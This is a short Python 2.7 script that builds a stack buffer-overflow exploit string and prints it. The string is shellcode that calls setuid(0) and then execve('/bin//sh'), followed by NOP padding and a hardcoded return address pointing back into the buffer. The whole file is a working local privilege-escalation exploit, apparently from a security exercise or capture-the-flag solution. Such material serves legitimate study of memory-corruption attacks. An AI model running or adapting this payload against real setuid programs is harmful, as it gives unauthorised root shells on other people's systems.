#!/usr/bin/python2.7

payload = (
'\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2' +
'\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89' +
'\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
)

bufferAddress = '\x40\x93\x0e\x08'
nops = '\x90' * (52-len(payload) - len(bufferAddress))
# returnAddress points back in the middle of our no op padding
exploit = payload + nops + bufferAddress
print(exploit)
